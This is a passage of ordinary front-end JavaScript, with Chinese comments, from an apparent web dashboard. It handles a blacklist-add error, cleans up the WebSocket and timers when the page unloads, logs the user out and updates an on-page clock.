        console.error('加入黑名单失败:', e);
        showToast(e.message || '加入黑名单失败', 'error');
    }
}

// 页面关闭前清理定时器
window.addEventListener('beforeunload', () => {
    isUnloading = true;
    stopAutoRefresh();
    if (reconnectTimer) {
        clearTimeout(reconnectTimer);
        reconnectTimer = null;
    }
    if (ws && ws.readyState === WebSocket.OPEN) {
        ws.close();
    }
});

// 退出登录
function logout() {
    if (confirm('确定要退出登录吗？')) {
        // 清除本地存储的认证状态（如果有）
        localStorage.clear();
        sessionStorage.clear();
        // 跳转到登出接口，服务端会清除 Cookie 并重定向到登录页
        window.location.href = '/logout';
    }
}

// 更新当前时间
function updateCurrentTime() {
    const now = new Date();
    const timeElement = document.getElementById('currentTime');
    if (timeElement) {
        timeElement.textContent = now.toLocaleString();
    }
}

// 初始化连接
connectWebSocket();

// 初始化当前时间并每秒更新
updateCurrentTime();
setInterval(updateCurrentTime, 1000);